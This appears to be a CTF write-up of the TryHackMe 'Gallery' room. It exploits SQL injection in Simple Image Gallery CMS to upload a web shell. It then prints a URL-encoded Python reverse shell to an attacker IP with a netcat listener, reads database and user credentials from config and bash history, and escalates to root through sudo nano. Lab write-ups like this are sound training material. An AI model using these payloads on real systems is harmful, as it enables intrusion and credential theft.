---
title: Write-up — Gallery
date: 2025-10-30 10:00:00 AM
categories: [Write-up, Try Hack Me]
tags: [Try Hack Me, Write-up, ctf]
image: 'assets/img/articles/Gallery.png'
description: "Exploit a SQLi vulnerability in Simple Image Gallery—this TryHackMe challenge demonstrates how to leverage HTTP request analysis and database errors to compromise web applications. Port scanning, CMS identification, and SQL injection—a realistic environment to test your pentesting skills on an Ubuntu/Apache stack. A hands-on case study to master web vulnerability exploitation and sharpen your offensive security expertise."
---

> Walkthrough of room Gallery from TryHackMe :
> https://tryhackme.com/room/gallery666

This TryHackMe room challenges you to exploit a SQL injection vulnerability in the Simple Image Gallery CMS by analyzing HTTP responses, identifying misconfigurations, and gaining admin access through manual payload crafting.

---

# Discovery

## Port Scan

```
22/ssh open syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
```
## CMS identification

- Cannot access `http://gallery.thm`
- But I can access `http://gallery.thm:8080/`, which redirects to `http://gallery.thm/gallery/login.php`

![](/assets/img/2025-10-31-THM-Gallery/login.png)

A quick Google search for **Simple Image Gallery System** allows me to identify the CMS used here: `Simple Image Gallery`.

![](/assets/img/2025-10-31-THM-Gallery/simple_image_gallery_joomla.png)

## Vulnerability assessment

### SQL Injection
By submitting a random password for the `admin` user, I found an interesting HTTP response.

**REQUEST**
```
POST /gallery/classes/Login.php?f=login HTTP/1.1
Host: 10.10.15.221
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 30
Origin: http://10.10.15.221
Connection: keep-alive
Referer: http://10.10.15.221/gallery/login.php
Cookie: PHPSESSID=i668g1eqir36n7hbc59ldm2obi
Priority: u=0

username=admin&password=sqlvkr
```

**RESPONSE**
```
HTTP/1.1 200 OK
Date: Thu, 30 Oct 2025 22:54:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 110
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('sqlvkr') "}
```


The SQL query executed after my request. *What a neat SQL injection!*

### CVE-2023-27040

![](/assets/img/2025-10-31-THM-Gallery/cve_found.png)

We got 3 CVE for the CMS:
- CVE-2021-38819 -> SQL injection
- CVE-2021-38753 -> Unrestricted file upload
- CVE-2023-27040 -> Remote Code Execution

Not knowing yet the version of the CMS, it is likely vulnerable to the most recent CVE (**CVE-2023-27040**)

Basically, the PoC ([here](https://www.exploit-db.com/exploits/50214))  exploit the SQLi we found early and upload a Web Shell, then print the Shell URL. Two for the price of one!

***
# Exploitation

## The PoC
It returns the link of the Webshell.

![](/assets/img/2025-10-31-THM-Gallery/poc.png)

As wee can see that the Web Shell works properly.

![](/assets/img/2025-10-31-THM-Gallery/webshell.png)

## Payload

Now time to craft a payload to get access to the web server. (I use Reverse Shell Generator)

```bash
sudo ufw allow 1984
nc -lvnp 1984
```

```bash
python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.14.106.223%22%2C1984%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

## Initial access on server

In the `gallery` directory, we can see a php file named `initialize.php`.

![](/assets/img/2025-10-31-THM-Gallery/see_initialize_php.png)

No surprise it contains some credentials, the database admin credentials to be precise.

```php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```

**Cred:** `gallery_user:passw0rd321`

So let's try the credentials.

First we should determine which client can be used to interact with database.

![](/assets/img/2025-10-31-THM-Gallery/finding_the_database_client.png)

The client is my **mysql**.

`mysql -u gallery_user -p`


```sql
show databases;
use gallery_db;

show tables;
describe users;

select username, password from users;

-- Output
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | a228b12a08b6527e7978cbe5d914531c |
+----------+----------------------------------+
```

The user flag is `/home/mike/user.txt` but we can't see it yet.

Before eventually moving to SUID/GUID, let's find all mike's owning files or directories.

```bash
find / -user mike -ls 2>/dev/null
find / -name "*mike*" -ls 2>/dev/null
```

The first command return files and directories in `/home/mike`.

```bash
4 drwxr-xr-x   6 mike     mike     /home/mike
4 -rwx------   1 mike     mike     /home/mike/user.txt
4 drwxrwxr-x   3 mike     mike     /home/mike/.local
4 drwx------   3 mike     mike     /home/mike/.local/share
4 -rw-r--r--   1 mike     mike     /home/mike/.bashrc
4 -rw-------   1 mike     mike     /home/mike/.bash_history
4 drwx------   3 mike     mike     /home/mike/.gnupg
4 -rw-r--r--   1 mike     mike     /home/mike/.bash_logout
4 drwx------   2 mike     mike     /home/mike/images
4 drwx------   2 mike     mike     /home/mike/documents
4 -rw-r--r--   1 mike     mike     /home/mike/.profile
```

The second command has a more interesting output:

```bash
drwxr-xr-x   6 mike     mike   /home/mike
drwxr-xr-x   5 root     root   /var/backups/mike_home_backup
```

![](/assets/img/2025-10-31-THM-Gallery/bash_history_file.png)

Now, we are able to read the `.bash_history` file:

```bash
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

It seems, Mike entered his password after a `sudo -l` command. His password is `b3stpass0rdbr0xx`. We can now ssh to mike user account.

# Privilege Escalation

Now we are connected on the server as user `mike`. The goal is to escalate to user `root`. There is a third user `ubuntu` but it's home directory is accessible only by `root` user.

Let's check sudo permissions for user `mike`:

```bash
sudo -l

Matching Defaults entries for mike on ip-10-10-15-221:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-10-15-221:
	(root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

So we can execute the following command as **root** *without password*: `/bin/bash /opt/rootkit.sh`. Before executing the script, let's see what it can do.

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

The script allows the user to interact with **RootKit Hunter** (a security tool).

> Some security tools need to be executed as root because they perform tasks on the OS that require elevated privileges.

Everything seems legit... But it opens `nano` with `root` privileges. So knowing `nano` is part of GTFObins (link [here](https://gtfobins.github.io/gtfobins/nano/#sudo)), GOTCHA. We just have to select `read` option after executing the script.

```bash
sudo nano # we can skip this part as the nano
^R^X # Ctrl+R then Ctrl+X
reset; sh 1>&0 2>&0
```

And voilà !

![](/assets/img/2025-10-31-THM-Gallery/root_privileges.png)

All flags down, mission passed.

![](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExejBueW15czhhbm82bGZydWlmbjc2ZHJxdHZ0eHE3MjAwNDhjZWh5OSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Ju7l5y9osyymQ/giphy.gif)

See you soon!

> "SQL injection is often referenced as the most common type of attack on websites. It is being used extensively by hackers and pen-testers on web applications."
OWASP Top Ten